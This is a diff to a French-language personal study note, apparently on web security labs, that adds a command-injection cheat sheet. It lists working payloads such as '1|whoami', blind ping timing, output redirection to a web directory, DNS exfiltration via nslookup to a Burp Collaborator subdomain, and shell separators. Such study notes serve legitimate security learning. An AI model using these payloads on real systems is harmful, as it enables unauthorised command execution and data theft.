@@ -104,3 +104,12 @@ statut: en cours
 - Filtre **Images** de **Proxy > HTTP history** — retrouver l'URL de service des fichiers téléversés
 - Techniques de contournement d'extension, de configuration et de contenu : à ajouter quand elles seront étudiées
 - Détail : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]
+
+### Command injection ([[Command-injection]])
+- `1|whoami` dans `storeID` - injection simple avec sortie visible
+- `& echo aiwefwlguh &` - test de détection avec sortie visible ; le second `&` isole la suite de la commande d'origine
+- `& ping -c 10 127.0.0.1 &` - détection aveugle par délai (`-n` sous Windows)
+- `& whoami > /var/www/static/whoami.txt &` puis `GET /whoami.txt` - redirection de la sortie vers un répertoire web
+- ``& nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN &`` - exfiltration out-of-band par DNS
+- Séparateurs à essayer : `&`, `&&`, `|`, `||`, `;` et saut de ligne `%0a` (les deux derniers : Unix seulement) ; `` `cmd` `` et `$(cmd)` sur Unix
+- Détail : [[Command-injection]]
